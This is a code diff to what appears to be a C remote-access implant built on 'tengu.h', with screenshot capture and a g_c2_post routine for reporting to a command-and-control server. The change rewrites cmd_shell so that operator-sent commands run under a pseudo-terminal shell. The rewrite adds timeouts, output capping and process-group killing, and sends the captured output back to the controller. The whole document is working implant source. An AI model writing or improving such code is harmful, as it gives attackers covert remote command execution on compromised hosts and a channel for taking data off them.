@@ -5,6 +5,10 @@
 #include <unistd.h>
 #include <dirent.h>
 #include <sys/stat.h>
+#include <sys/wait.h>
+#include <sys/ioctl.h>
+#include <sys/poll.h>
+#include <fcntl.h>
 #include <errno.h>
 #include <signal.h>
 #include <ftw.h>
@@ -14,6 +18,7 @@
 #include <arpa/inet.h>
 #include <netinet/in.h>
 #include <time.h>
+#include <termios.h>
 
 #include "tengu.h"
 
@@ -128,28 +133,178 @@ static Buf* build_screenshot_result(uint32_t req_id, const char* path, const uin
 
 // --- Command implementations ---
 
-void cmd_shell(uint32_t req_id, const char* cmdstr) {
-    FILE* fp = popen(cmdstr, "r");
-    if (!fp) {
-        // report error
-        Buf* pkt = build_output_packet(req_id, COMMAND_ERROR, "popen failed");
+#define SHELL_PTY_MAX_MS   120000
+#define SHELL_PTY_MAX_OUT  (2 * 1024 * 1024)
+
+static int pty_spawn(const char* cmd, pid_t* out_pid)
+{
+    int master = posix_openpt(O_RDWR | O_NOCTTY);
+    if ( master < 0 )
+        return -1;
+    if ( grantpt(master) != 0 || unlockpt(master) != 0 ) {
+        close(master);
+        return -1;
+    }
+
+    char* slname = ptsname(master);
+    if ( !slname ) {
+        close(master);
+        return -1;
+    }
+
+    int slave = open(slname, O_RDWR | O_NOCTTY);
+    if ( slave < 0 ) {
+        close(master);
+        return -1;
+    }
+
+    pid_t pid = fork();
+    if ( pid < 0 ) {
+        close(master);
+        close(slave);
+        return -1;
+    }
+
+    if ( pid == 0 ) {
+        close(master);
+        setsid();
+        ioctl(slave, TIOCSCTTY, 0);
+
+        struct winsize ws;
+        memset(&ws, 0, sizeof(ws));
+        ws.ws_row = 24;
+        ws.ws_col = 120;
+        ioctl(slave, TIOCSWINSZ, &ws);
+
+        dup2(slave, 0);
+        dup2(slave, 1);
+        dup2(slave, 2);
+        if ( slave > 2 )
+            close(slave);
+
+        setenv("TERM", "xterm", 1);
+        execl("/bin/sh", "sh", "-c", cmd, (char*)NULL);
+        _exit(127);
+    }
+
+    close(slave);
+    *out_pid = pid;
+    return master;
+}
+
+static void pty_append(char** out, size_t* len, const char* data, size_t n, int* truncated)
+{
+    if ( *truncated || n == 0 )
+        return;
+    if ( *len + n > SHELL_PTY_MAX_OUT ) {
+        n = SHELL_PTY_MAX_OUT - *len;
+        *truncated = 1;
+    }
+    if ( n == 0 )
+        return;
+
+    char* p = realloc(*out, *len + n + 1);
+    if ( !p ) {
+        *truncated = 1;
+        return;
+    }
+    *out = p;
+    memcpy(*out + *len, data, n);
+    *len += n;
+    (*out)[*len] = '\0';
+}
+
+void cmd_shell(uint32_t req_id, const char* cmdstr)
+{
+    pid_t pid = -1;
+    int   master = pty_spawn(cmdstr, &pid);
+    if ( master < 0 ) {
+        Buf* pkt = build_output_packet(req_id, COMMAND_ERROR, "pty: failed to spawn");
         g_c2_post(pkt->data, pkt->size, NULL, NULL);
         buf_free(pkt);
         return;
     }
 
-    // Read all output.
-    char* out = NULL;
-    size_t out_len = 0;
-    char tmp[4096];
-    while (fgets(tmp, sizeof(tmp), fp)) {
-        size_t l = strlen(tmp);
-        out = realloc(out, out_len + l + 1);
-        memcpy(out + out_len, tmp, l);
-        out_len += l;
+    int flags = fcntl(master, F_GETFL, 0);
+    if ( flags >= 0 )
+        fcntl(master, F_SETFL, flags | O_NONBLOCK);
+
+    char*  out       = NULL;
+    size_t out_len   = 0;
+    int    truncated  = 0;
+    int    child_dead = 0;
+    int    timed_out  = 0;
+    time_t t0         = time(NULL);
+
+    while ( !child_dead && !timed_out ) {
+        struct pollfd pfd = { .fd = master, .events = POLLIN };
+        int pr = poll(&pfd, 1, 200);
+
+        if ( pr > 0 && (pfd.revents & (POLLIN | POLLHUP | POLLERR)) ) {
+            char tmp[4096];
+            for (;;) {
+                ssize_t n = read(master, tmp, sizeof(tmp));
+                if ( n > 0 ) {
+                    pty_append(&out, &out_len, tmp, (size_t)n, &truncated);
+                    continue;
+                }
+                if ( n == 0 || (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK) )
+                    child_dead = 1;
+                break;
+            }
+        }
+
+        int status = 0;
+        if ( waitpid(pid, &status, WNOHANG) == pid )
+            child_dead = 1;
+
+        if ( (time(NULL) - t0) * 1000 >= SHELL_PTY_MAX_MS )
+            timed_out = 1;
+    }
+
+    /* Drain whatever is left after exit. */
+    for (;;) {
+        char tmp[4096];
+        ssize_t n = read(master, tmp, sizeof(tmp));
+        if ( n > 0 )
+            pty_append(&out, &out_len, tmp, (size_t)n, &truncated);
+        else
+            break;
+    }
+
+    if ( !child_dead ) {
+        kill(-pid, SIGKILL);
+        kill(pid, SIGKILL);
+        waitpid(pid, NULL, 0);
+    }
+
+    close(master);
+
+    if ( out && out_len > 0 ) {
+        size_t w = 0;
+        for ( size_t r = 0; r < out_len; r++ ) {
+            if ( out[r] == '\r' ) {
+                if ( r + 1 < out_len && out[r + 1] == '\n' )
+                    continue;
+                out[w++] = '\n';
+            } else {
+                out[w++] = out[r];
+            }
+        }
+        out_len = w;
         out[out_len] = '\0';
     }
-    pclose(fp);
+
+    if ( timed_out ) {
+        const char* m = "\n[pty] timed out after 120s\n";
+        int ignore = 0;
+        pty_append(&out, &out_len, m, strlen(m), &ignore);
+    }
+    if ( truncated ) {
+        const char* m = "\n[pty] output truncated\n";
+        int ignore = 0;
+        pty_append(&out, &out_len, m, strlen(m), &ignore);
+    }
 
     Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, out ? out : "");
     g_c2_post(pkt->data, pkt->size, NULL, NULL);
